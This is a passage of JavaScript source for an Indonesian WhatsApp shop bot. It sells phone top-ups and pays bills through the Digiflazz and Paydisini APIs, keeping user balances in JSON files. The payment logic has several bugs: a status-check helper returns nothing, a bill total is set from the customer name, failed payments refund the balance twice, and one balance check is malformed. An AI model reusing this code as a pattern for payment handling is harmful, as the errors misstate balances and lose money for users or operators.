| *Profit :* ${formatmoney(harga - response.data.data.price)}

*# INFORMASI PENGGUNA:*
| *Nama :* ${pushname}
| *Role :* ${cek("role", m.sender)}
| *Transaksi Dari No :* ${m.sender.split('@')}
| *Saldo Pengguna :* ${formatmoney(sl)}

*# INFORMASI SALDO SERVER*
| *Sisa saldo Digi :* ${formatmoney(response.data.data.buyer_last_saldo)}`
  kris.sendMessage(global.nomorKu, {text:owl});   


                                reply(`✅ *「 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 」* ✅
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*» ID* : ${tanggal + jam}
*» Layanan* : ${nama}
*» Data* : ${tujuan}
*» Harga* : Rp ${formatmoney(harga)}
*» Keterangan* : ${response.data.data.status} 

*O━•『SERIAL NUMBER』•━O*
${response.data.data.sn}

*${toko}*
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`)
const trxFilePath = './Pengaturan/database/datatrx.json';
    const trxUserData = JSON.parse(fs.readFileSync(trxFilePath, 'utf8'));

    const newTransactionData = {
        buyer: m.sender,
        status: response.data.data.message,
        ref_id: response.data.data.ref_id,
        jam: moment.tz('Asia/Jakarta').format('HH:mm:ss'),
        date: tanggal, 
        produk: nama,
        harga_modal: response.data.data.price,
        harga: harga,
        tujuan: tujuan,
        invoice: response.data.data.sn
    };
    trxUserData.push(newTransactionData);
    fs.writeFileSync(trxFilePath, JSON.stringify(trxUserData, null, 2), 'utf8');    
break;
              }
            }
          })
          .catch(error => {
            if (error.response) {              
            sett("+saldo", m.sender, har)           
 reply(`           _${toko}_\n       𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 ( ${error.response.data.data.status} )\n══════════════════════\n_Tujuan :_ ${tujuan}\n_Layanan :_ ${nama}\n_Harga :_ ${formatmoney(harga)}\n_Mess :_ ${error.response.data.data.message}\n\n*Saldo Anda Bertambah dikarenakan produk gagal silahkan membeli dengan Methode saldo*`) 
            }
   });
   
}
      
function cek_tagihan(kod_p, id_p) {
  for (let i of list_pasca) {
    if (i.buyer_sku_code == kod_p) {
      const data_deposit = JSON.parse(
        fs.readFileSync(PathPasca + sender.split("@")[0] + ".json")
      );
      const crypto = require("crypto");
      const axios = require("axios");
      let reff1 = data_deposit.ID;
      let signature = crypto
        .createHash("md5")
        .update(digiuser + digiapi + reff1)
        .digest("hex");

      var config = {
        method: "POST", // Set the HTTP method to POST
        url: "https://api.digiflazz.com/v1/transaction", // Set the target URL
        data: {
          commands: "inq-pasca",
          username: digiuser,
          buyer_sku_code: kod_p,
          customer_no: id_p,
          ref_id: reff1,
          sign: signature,
        },
      };

      axios(config)
        .then(function (response) {
          console.log(response);
          if (response.data.data.status == "Gagal") {
            m.reply(`*${response.data.data.message}*`);
          }
          if (response.data.data.status == "Sukses") {
            data_deposit.data.nama = response.data.data.customer_name;
            data_deposit.data.tagihan = response.data.data.customer_name;
            fs.writeFileSync(PathPasca + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 2));
            let snn = `
              *「 CEK TAGIHAN ${i.brand.toUpperCase()} 」

                Nama Pelanggan : ${response.data.data.customer_name} 
                ID Pelanggan : ${response.data.data.customer_no}
                Total Lembar Tagihan : ${response.data.data.desc.lembar_tagihan}
                Total Tagihan : Rp${response.data.data.selling_price}
                Harga Asli : Rp${response.data.data.price}
                Admin : Rp${response.data.data.admin}
                Sisa Saldo : Rp${formatmoney(cek("saldo", m.sender))}
                *SUDAH TERMASUK ADMIN*
  
                _Untuk Membayar Tagihan Silahkan Klik Button Bayar Tagihan, pastikan saldo kamu cukup_`
          const msgs = generateWAMessageFromContent(
            from,
            {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: snn,
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                      text: `${toko}`,
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                    }),
                    nativeFlowMessage:
                      proto.Message.InteractiveMessage.NativeFlowMessage.create(
                        {
                          buttons: [
                            {
                              name: "quick_reply",
                              buttonParamsJson:
                                '{"display_text":"Bayar Tagihan","id":"byrtagihan"}',
                            },
                          ],
                        }
                      ),
                  }),
                },
              },
            },
            {}
          );

          kris.relayMessage(from, msgs.message, {
            messageId: msgs.key.id,
          });

         }
        })
        .catch(function (error) {
          console.log(error);
          m.reply("Terjadi kesalahan saat memproses permintaan.");
        });
    }
  }
}



   if (command === "opap") {
     if (!q) return reply(`Ingin Topup? silahkan ketik #cekharga`) 
    const produk = q;  // Pastikan produk diambil dari argumen kedua
    const senderId = sender.split("@")[0];
    const filePath = PathTrx + senderId + ".json";

    if (!fs.existsSync(filePath)) {
        let produkDitemukan = false; // Tambahkan flag untuk melacak jika produk ditemukan
        for (let i of list_produk) {
            if (i.buyer_sku_code == produk) {
                produkDitemukan = true; // Set flag ke true jika produk ditemukan
                const har = hitungHargaRole(i.price);
                const deposit_object = {
                    ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
                    session: "amount",
                    number: sender,
                    produk: i.product_name,
                    kode: produk,
                    desc: i.desc,
                    harga: har,
                    category: i.category,
                    brand: i.brand,
                    data: {
                        nomor: ""
                    }
                };
                fs.writeFileSync(filePath, JSON.stringify(deposit_object, null, 2));
                reply("Silahkan Kirimkan Nomor Tujuan");
                return; // Keluar dari loop setelah menemukan produk yang cocok
            }
        }
        if (!produkDitemukan) {
            reply("Produk tidak ditemukan.");
        }
    } else {
        kris.sendMessage(from, { text: "Proses Pesanan kamu masih ada yang belum terselesaikan untuk membatalkan silahkan ketik #batal" }, { quoted: m });
    }
}

if (fs.existsSync(PathTrx + sender.split("@")[0] + ".json")) {
    if (!m.key.fromMe) {
        const data_deposit = JSON.parse(fs.readFileSync(PathTrx + sender.split("@")[0] + ".json"));
         if (data_deposit.session === "amount") {
            data_deposit.data.nomor = chath;
            data_deposit.session = "konfirmasi_pembayaran";
            fs.writeFileSync(PathTrx + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 2));
            const msgs = generateWAMessageFromContent(from, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": {
                            "deviceListMetadata": {},
                            "deviceListMetadataVersion": 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `Silahkan Pilih Menu Pembayaran Di Bawah Ini
`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: `${toko}`
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": "{\"display_text\":\"Saldo\",\"id\":\"paysal\"}"
                                    }
                                ],
                            })
                        })
                    }
                }
            }, {});

            kris.relayMessage(from, msgs.message, {
                messageId: msgs.key.id
            });
        } else if (data_deposit.session === "konfirmasi_pembayaran") {
            if (chath.toLowerCase() === "paylang") {             
                const msgs = generateWAMessageFromContent(from, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": {
                            "deviceListMetadata": {},
                            "deviceListMetadataVersion": 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `📝 *FORM TOP UP* 📝

*Produk ID: ${data_deposit.kode}* 
*Tujuan: ${data_deposit.data.nomor}* 

*Kategori: ${data_deposit.category}*
*Brand: ${data_deposit.brand}* 
*Produk: ${data_deposit.produk}*
*Harga: ${data_deposit.harga}*

Apakah data tersebut sudah benar? 
Akan gagal apabila terdapat kesalahan input.
`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: `${toko}`
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": "{\"display_text\":\"Benar\",\"id\":\"yeslang\"}"
                                    },
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": "{\"display_text\":\"Salah\",\"id\":\".batal\"}"
                                    }
                                ],
                            })
                        })
                    }
                }
            }, {});

            kris.relayMessage(from, msgs.message, {
                messageId: msgs.key.id
            });
              data_deposit.session = "konfirmasi_pesanan";
              fs.writeFileSync(PathTrx + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 2));
            } else if (chath.toLowerCase() === "paysal") {
            data_deposit.session = "konfirmasi_pesanan";
              fs.writeFileSync(PathTrx + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 2));
               const saldo = cek("saldo", m.sender) 
               const sal = parseFloat(saldo) 
                if(data_deposit.harga > cek("saldo", m.sender))  return reply("Mohon maaf saldo anda kurang silahkan deposit terlebih dahulu") 
                const msgs = generateWAMessageFromContent(from, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": {
                            "deviceListMetadata": {},
                            "deviceListMetadataVersion": 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                              
                                  text: `📝 *FORM TOP UP* 📝

*Produk ID: ${data_deposit.kode}* 
*Tujuan: ${data_deposit.data.nomor}* 

*Kategori: ${data_deposit.category}*
*Brand: ${data_deposit.brand}* 
*Produk: ${data_deposit.produk}*
*Harga: ${data_deposit.harga}*

*Saldo Anda: ${formatmoney(sal)}*
Apakah data tersebut sudah benar? 
Akan gagal apabila terdapat kesalahan input.
`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: `${toko}`
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": "{\"display_text\":\"Benar\",\"id\":\"yessal\"}"
                                    },
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": "{\"display_text\":\"Salah\",\"id\":\".batal\"}"
                                    }
                                ],
                            })
                        })
                    }
                }
            }, {});

            kris.relayMessage(from, msgs.message, {
                messageId: msgs.key.id
            });
                } 
                
        } else if (data_deposit.session === "konfirmasi_pesanan") {
        if (chath.toLowerCase() === "yeslang") {     
        buy(data_deposit.kode, data_deposit.data.nomor)
        } else if (chath.toLowerCase() === "yessal") {
         salya(data_deposit.kode, data_deposit.data.nomor, data_deposit.produk, data_deposit.harga)
        }
       }
        
    }
}        
          


 if  (fs.existsSync(PathPasca + sender.split("@")[0] + ".json")) {
   if (!m.key.fromMe) {
     const data_deposit = JSON.parse(
       fs.readFileSync(PathPasca + sender.split("@")[0] + ".json")
     );
     if (data_deposit.session === "costumerno") {
       data_deposit.data.costumerno = chath;
       data_deposit.session = "konfirmasi_pembayaran";
       fs.writeFileSync(
         PathPasca + sender.split("@")[0] + ".json",
         JSON.stringify(data_deposit, null, 2)
       );
       const msgs = generateWAMessageFromContent(
         from,
         {
           viewOnceMessage: {
             message: {
               messageContextInfo: {
                 deviceListMetadata: {},
                 deviceListMetadataVersion: 2,
               },
               interactiveMessage: proto.Message.InteractiveMessage.create({
                 body: proto.Message.InteractiveMessage.Body.create({
                   text: `Silahkan Klik Cek Tagihan Untuk Melanjutkan
`,
                 }),
                 footer: proto.Message.InteractiveMessage.Footer.create({
                   text: `${toko}`,
                 }),
                 header: proto.Message.InteractiveMessage.Header.create({
                   hasMediaAttachment: false,
                 }),
                 nativeFlowMessage:
                   proto.Message.InteractiveMessage.NativeFlowMessage.create({
                     buttons: [
 {
                                        "name": "quick_reply",
                                        "buttonParamsJson": "{\"display_text\":\"Cek Tagihan\",\"id\":\"tagihan_paysaldo\"}"
                                    }
                     ],
                   }),
               }),
             },
           },
         },
         {}
       );
       kris.relayMessage(from, msgs.message, {
         messageId: msgs.key.id,
       });
     } else if (data_deposit.session === "konfirmasi_pembayaran") {
       if (chath.toLowerCase() === "tagihan_paysaldo") {
        cek_tagihan(data_deposit.kode, data_deposit.data.costumerno);
       }
    }
   }
 }

async function getList(kategori, brand, type) {
    if (cek("id", m.sender) == null) return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);

    let { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
    let fs = require('fs');

    // Baca data dari file JSON
    let database = require('./Pengaturan/database/datadigiflaz.json');
    let brandToDisplay = `${brand.toUpperCase()}`;
    let filteredProducts = database.filter(item => 
        item.category === kategori && 
        item.brand === brand && 
        item.type === type
    );

    // Fungsi format uang
    const formatmoney = (amount) => {
        return new Intl.NumberFormat('id-ID', {
            style: 'currency',
            currency: 'IDR'
        }).format(amount);
    };

    // Urutkan produk berdasarkan harga dari terendah ke terbesar
    filteredProducts.sort((a, b) => a.price - b.price);

    // Buat sections dari data yang diambil dari database JSON
    let sections = [{
        title: brandToDisplay, // Title utama
        rows: filteredProducts.map(item => {
            const status = item.seller_product_status;
            const seller = status ? '✅ Tersedia' : '⛔ Gangguan';
            const harga = hitungHargaRole(item.price);

            return {
                header: `${seller} (${item.buyer_sku_code})`, // Menggunakan buyer_sku_code sebagai header
                title: item.product_name,
                description: `${formatmoney(harga)}`, // Menambahkan status ke dalam deskripsi
                id: `opap ${item.buyer_sku_code}`
            };
        })
    }];

    // Buat JSON string untuk buttonParamsJson
    let buttonParamsJson = JSON.stringify({
        title: "Klik Disini",
        sections: sections
    });

    // Buat pesan interaktif
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan Klik Button Disini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: toko
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: buttonParamsJson
                        }]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                    }
                })
            }
        }
    }, {});

    // Kirim pesan interaktif
    await kris.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
 
 function saveDataToFile(filePath, data) {
  fs.writeFile(filePath, JSON.stringify(data, null, 2), (err) => {
    if (err) {
      console.log('Gagal menyimpan data:', err);
    } else {
      console.log(`Sukses menyimpan data ke ${filePath}`);
    }
  
  });
}
    
async function checkPaymentStatus(bah, trx_id, amount,attempt = 1,
) {
    const nominal = Number(amount)
    const maxAttempts = 5; // Batas maksimum percobaan
    const cekw = cekWaktu();
    const formData = new FormData();
    formData.append("key", paydisini.apikey);
    formData.append("request", "status");
    formData.append("unique_code", trx_id);
    formData.append(
        "signature",
        crypto
            .createHash("md5")
            .update(paydisini.apikey + trx_id + "StatusTransaction")
            .digest("hex"),
    );

    try {
        const response = await axios.post(
            "https://paydisini.co.id/api/",
            formData,
            {
                headers: {
                    ...formData.getHeaders(),
                },
            },
        );

        if (response.data.success && response.data.data.status === "Pending") {
            if (attempt < maxAttempts) {
                setTimeout(() => {
                    checkPaymentStatus(bah, trx_id, amount, attempt + 1,
                    );
                }, 60000);
            } else {
                kris.sendMessage(m.chat, { delete: bah.key });
                const sa = `🛍️ Payment Canceled
  ${trx_id}

  Payment kamu telah kami batalkan dikarenakan kamu tidak melakukan pembayaran dalam jangka waktu yang ditentukan!`;
                await reply(sa);
            }
        } else if (
            response.data.success &&
            response.data.data.status === "Success"
        ) {
  sett("+saldo", m.sender, nominal)           
            kris.sendMessage(m.chat, { delete: bah.key });
            
            let ssd = `🛍️ Deposit Succsesfully
${trx_id}
                
Detail Deposit:
— Amount: ${formatmoney(amount)}
— Trx Date: ${cekw}
— Saldo: ${cek("saldo", m.sender)}
        
Pembayaranmu Telah Kami Terima, Terimakasih Sudah mempercayai kami ${global.store}`;
            reply(ssd);
            const messagess = `[ Notifikasi Deposit ]

Hai kak ,
Ada deposit yang telah dibayar!!

- Member : ${m.sender.split("@")[0]}
- Kode Unik : ${trx_id}
- Jumlah : ${formatmoney(amount)}

- Trx Date : ${cekw}
— Saldo: ${cek("saldo", m.sender)}
             
Silahkan Cek Saldo Paydisini nya kak `;
kris.sendMessage(`${OWNER}@s.whatsapp.net`, {text: messagess})
        } else {
            kris.sendMessage(m.chat, { delete: bah.key });
            await reply("Pembayaran Anda Dibatalkan Otomatis Oleh Bot.");
        }
    } catch (error) {
        console.error("Error occurred while checking payment status:", error);
    }
}
   
async function getPaket(kategori, brand) {
    if (cek("id", m.sender) == null) return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);

    let { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
    let fs = require('fs');

    // Baca data dari file JSON
    let database = require('./Pengaturan/database/datadigiflaz.json');
    let brandToDisplay = `${brand.toUpperCase()}`;
    let filteredProducts = database.filter(item => 
        item.category === kategori && 
        item.brand === brand
    );

    // Fungsi format uang
    const formatmoney = (amount) => {
        return new Intl.NumberFormat('id-ID', {
            style: 'currency',
            currency: 'IDR'
        }).format(amount);
    };

    // Urutkan produk berdasarkan harga dari terendah ke terbesar
    filteredProducts.sort((a, b) => a.price - b.price);

    // Buat sections dari data yang diambil dari database JSON
    let sections = [{
        title: 'List Produk', // Title utama
        rows: filteredProducts.map(item => {
            const harga = hitungHargaRole(item.price);
            const status = item.seller_product_status;
            const seller = status ? '✅ Tersedia' : '⛔ Gangguan';

            return {
                header: `${seller} (${item.buyer_sku_code})`, // Menggunakan buyer_sku_code sebagai header
                title: item.product_name,
                description: `${formatmoney(harga)}`, // Menambahkan status ke dalam deskripsi
                id: `opap ${item.buyer_sku_code}`
            };
        })
    }];

    // Buat JSON string untuk buttonParamsJson
    let buttonParamsJson = JSON.stringify({
        title: "Klik Disini",
        sections: sections
    });

    // Buat pesan interaktif
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan Klik Button Disini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: toko
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: buttonParamsJson
                        }]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                    }
                })
            }
        }
    }, {});

    // Kirim pesan interaktif
    await kris.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}

function isPaymentTimeExpired(depositTime, currentTime) {
    const depositPlus5Minutes = depositTime + 5 * 60 * 1000; // Menambahkan 5 menit ke waktu deposit
    return currentTime > depositPlus5Minutes;
}

function isWithin5Minutes(depositTime, currentTime) {
    const depositPlus5Minutes = depositTime + 5 * 60 * 1000; // Menambahkan 5 menit ke waktu deposit
    return currentTime <= depositPlus5Minutes;
}         

function order(produk, tujuan, refferensi) {
if (cek("saldo", m.sender === null)) {
          m.reply(`Kamu tidak memiliki saldo, silahkan deposit`);
          return;
        }
for(let i of list_produk){
if(i.buyer_sku_code == produk){ 
const har = hitungHargaRole(i.price);


if(har > cek("saldo", m.sender)) return reply(`Maaf,saldo kamu tidak cukup untuk membeli produk itu Silahkan Deposit Terlebih Dahulu.`)

let nama_produkk = i.product_name
descc = i.desc
sett("harga", m.sender, har)
sett("layanan", m.sender, nama_produkk)
sett("status", m.sender, false)
sett("tujuan", m.sender, tujuan)
sett("kode_layanan", m.sender, produk)
sett("desc", m.sender, descc)
sett("reff", m.sender, refferensi)
}
}
const ha = cek("harga", m.sender) 
const sa = cek("saldo", m.sender) 
let an = `_🛍️ORDER CONFIRMATION_

_››  ID Produk :_ ${cek("kode_layanan", m.sender)}
_››  Layanan :_ ${cek("layanan", m.sender)}
_››  Penerima :_ ${cek("tujuan", m.sender)}
_››  Total :_ ${formatmoney(ha)}
_››  Saldo Anda :_ ${formatmoney(sa)}
_››  Note :_ ${cek("desc", m.sender)}

Ketik *${prefix}yes* untuk Melanjutkan Transaksi
Ketik *${prefix}batal* untuk Membatalkan pesanan`
if(cek("layanan", m.sender) == "") return reply(`Maaf kak,produk *${produk}* tidak ditemukan\nSilahkan liat kode produk di *${prefix}listharga*`)
m.reply(an)
 var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
}  
}
async function getListPasca(brand) {
  if (cek("id", m.sender) == null)
    return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);

  let {
    generateWAMessageFromContent,
    proto,
  } = require("@whiskeysockets/baileys");
  let fs = require("fs");

  // Baca data dari file JSON
  let database = require("./Pengaturan/database/pascabayar.json");
  let brandToDisplay = `${brand.toUpperCase()}`;
  
  let filteredProducts = database.filter(
    (item) =>
      item.brand === brand
  );
  let sections = [
    {
      
      title: brandToDisplay, // Title utama
      rows: filteredProducts.map((item) => {
        const admin = hitungHargaRole(item.admin);
        return {
          header: `${item.buyer_sku_code}`, // Menggunakan buyer_sku_code sebagai header
          title: item.product_name,
          description: `Admin ${formatmoney(admin)}`, // Menambahkan status ke dalam deskripsi
          id: `cektagihan ${item.buyer_sku_code}`,
        };
      }),
    },
  ];

  // Buat JSON string untuk buttonParamsJson
  let buttonParamsJson = JSON.stringify({
    title: "Klik Disini",
    sections: sections,
  });

  // Buat pesan interaktif
  let msg = generateWAMessageFromContent(
    from,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: "Silahkan Klik Button Disini",
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: toko,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: buttonParamsJson,
                  },
                ],
              }),
            contextInfo: {
              mentionedJid: [m.sender],
              forwardingScore: 999,
              isForwarded: true,
            },
          }),
        },
      },
    },
    {}
  );

  // Kirim pesan interaktif
  await kris.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
    
if (command) {
kris.sendPresenceUpdate(jd, from)
kris.readMessages([m.key])
}
 
 async function trtas(kode, username, refId, sign, costumerno) {
const requestData = {
    commands: 'status-pasca', 
    username: username,
    buyer_sku_code: kode,
    customer_no: costumerno,
    ref_id: refId,
    sign: sign
};
axios.post('https://api.digiflazz.com/v1/transaction', requestData)
    .then(response => {
        return response
    })
    .catch(error => {
        console.error('Error saat request:', error);
    });
 }   
     
//FITUR CASE BY kris
switch (command) {
    case 'byrcancel': {
        if(cek("id", m.sender) == null) return reply(`Anda Belum melakukannya Pendaftaran untuk daftar ketik (daftar nama|gmail)`)
if(!fs.existsSync(PathPasca + m.sender.split("@")[0] + ".json")) return reply('Anda Belum Melakukan Pesanan Pacabayar')   
        fs.unlinkSync(PathPasca + m.sender.split("@")[0] + ".json")
    }
      break;


 case 'byrtagihan': {
if(cek("id", m.sender) == null) return reply(`Anda Belum melakukannya Pendaftaran untuk daftar ketik (daftar nama|gmail)`)
if(!fs.existsSync(PathPasca + m.sender.split("@")[0] + ".json")) return reply('Anda Belum Melakukan Pesanan Pacabayar')   
let data_depo = JSON.parse(fs.readFileSync(PathPasca + sender.split("@")[0] + ".json")) 
if (m.isGroup) return m.reply('Fitur Khusus Private Chat')
let tagihan = `${data_depo.tagihan}` 
let id_pela = `${data_depo.data.costumerno}` 
let kod_pasca = `${data_depo.kode}` 
let lay_pas = `${data_depo.nama}` 
let totk = Number(tagihan) 
if(totk > cek("saldo", m.sender)) return reply(`Maaf,saldo kamu tidak cukup untuk membeli produk itu Silahkan Deposit Terlebih Dahulu.`)    
sett("-saldo", m.sender, totk)
  const crypto = require("crypto")
  const axios = require("axios")
  let reff1 = `${data_depo.ID}`
  let signature = crypto.createHash('md5')
    .update(digiuser + digiapi + reff1)
    .digest('hex');
  
  var config = {
    method: 'POST',  // Set the HTTP method to POST
    url: 'https://api.digiflazz.com/v1/transaction',  // Set the target URL
    data: {
   "commands": "pay-pasca",
      "username": digiuser,
      "buyer_sku_code": kod_pasca,
      "customer_no": id_pela,
      "ref_id": reff1,
      "sign": signature
  }
  };
  
  axios(config)
    .then(async res => {
    m.reply(`*「 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 」*`)
    
        let status = res.data.data.status;  
        console.log(status)        
    while (status !== 'Sukses') {
    await sleep(1000); 
    const response = await trtas(kod_pasca, digiuser, reff1, signature, id_pela);
    status = response.data.data.status; 
                  if (status == "Gagal") {
   sett("+saldo", m.sender, totk)             
                  reply(`           ${toko}\n       𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 ( Gagal )\n══════════════════════\nNama Layanan : ${lay_pas}\nReff ID :    ${response.data.data.ref_id}\nNomor Pelanggan :    ${response.data.data.customer_no}\nNama Pelanggan :      ${response.data.data.customer_name}\n────────\n\nTotal Tagihan : ${response.data.data.selling_price}\nPesan :    ${response.data.data.message}\n\n  *Mohon Maaf Produk Sedang Gangguan Silahkan coba lagi nanti*`) 
                  sett("+saldo", m.sender, totk)
                  break;
                  }
    if (status == "Sukses") {
    
   reply('sukses')
                  
    break;
                  }
                }
              })
              fs.unlinkSync(PathPasca + m.sender.split("@")[0] + ".json")
     }
    break
       /*
        case 'byrtagihan': {    
if(cek("id", m.sender) == null) return reply(`Anda Belum melakukannya Pendaftaran untuk daftar ketik (daftar nama|gmail)`)
if(!fs.existsSync(PathPasca + m.sender.split("@")[0] + ".json")) return reply('Anda Belum Melakukan Pesanan Pacabayar')   
let data_depo = JSON.parse(fs.readFileSync(PathPasca + sender.split("@")[0] + ".json")) 
if (m.isGroup) return m.reply('Fitur Khusus Private Chat')
let tagihan = `${data_depo.tagihan}` 
let id_pela = `${data_depo.nomor}`; 
let kod_pasca = `${data_depo.kode}`; 
let lay_pas = `${data_depo.nama}`; 
let totk = Number(tagihan); 
if(totk > cek("saldo", m.sender)) return reply(`Maaf,saldo kamu tidak cukup untuk membeli produk itu Silahkan Deposit Terlebih Dahulu.`)    
sett("-saldo", m.sender, totk);
  const crypto = require("crypto")
  const axios = require("axios")
  let reff1 = short.generate()
  let signature = crypto.createHash('md5')
    .update(digiuser + digiapi + reff1)
    .digest('hex');
  
  var config = {
    method: 'POST',  // Set the HTTP method to POST
    url: 'https://api.digiflazz.com/v1/transaction',  // Set the target URL
    data: {
   "commands": "pay-pasca",
      "username": digiuser,
      "buyer_sku_code": kod_pasca,
      "customer_no": id_pela,
      "ref_id": reff1,
      "sign": signature
  }
  };
 axios(config)
    .then(async res => {
    m.reply(`*「 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 」*`)
    let status = res.data.data.status;  
    console.log(status)        
while (status !== 'Sukses') {
await sleep(1000); 
const response = await axios(config);
status = response.data.data.status; 
              if (status == "Gagal") {
                            
                           
              reply('gagal')
              break;
              }       
    if (status == "Sukses") {
reply("sukses")
break;
              }
            }
          })
          .catch(error => {
            if (error.response) {   
                
 reply(`${error.response.data.data.message}`)                 
            }
   });
}
break  */

    case 'cektagihan': {
     if (!q) return reply(`Ingin Bayar Tagihan? silahkan ketik #cekharga`) 
    const produk = q; 
    const senderId = sender.split("@")[0];
    const filePath = PathPasca + senderId + ".json";
    if (!fs.existsSync(filePath)) {
        let produkDitemukan = false; 
        for (let i of list_pasca) {
            if (i.buyer_sku_code == produk) {
                produkDitemukan = true; 
                const har = hitungHargaRole(i.admin);
                const deposit_object = {
                    ID: require("crypto").randomBytes(10).toString("hex"),
                    session: "costumerno",
                    nama: "",
                    produk: i.product_name,
                    kode: produk,
                    tagihan: "",
                    admin: har,
                    brand: i.brand,
                    data: {
                        costumerno: ""
                    }
                };
                fs.writeFileSync(filePath, JSON.stringify(deposit_object, null, 2));
                reply("Silahkan Kirimkan Nomor Tujuan");
                return; 
            }
        }
        if (!produkDitemukan) {
            reply("Produk tidak ditemukan.");
        }
    } else {
        kris.sendMessage(from, { text: "Proses Pesanan kamu masih ada yang belum terselesaikan untuk membatalkan silahkan ketik #byrcancel" }, { quoted: m });
    }
} 
    case "pascabayar": {
  const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: global.author }}}
    if (cek("id", m.sender) == null) return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);
    
    let { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
    let database = require('./Pengaturan/database/pascabayar.json');
    
    // Filter berdasarkan kategori
    let filteredProducts = database.filter(item => item.category === "Pascabayar");
    
    // Gunakan Set untuk memastikan hanya satu produk per brand
    let uniqueBrands = new Set();
    let uniqueFilteredProducts = filteredProducts.filter(item => {
        if (!uniqueBrands.has(item.brand)) {
            uniqueBrands.add(item.brand);
            return true;
        }
        return false;
    });
    
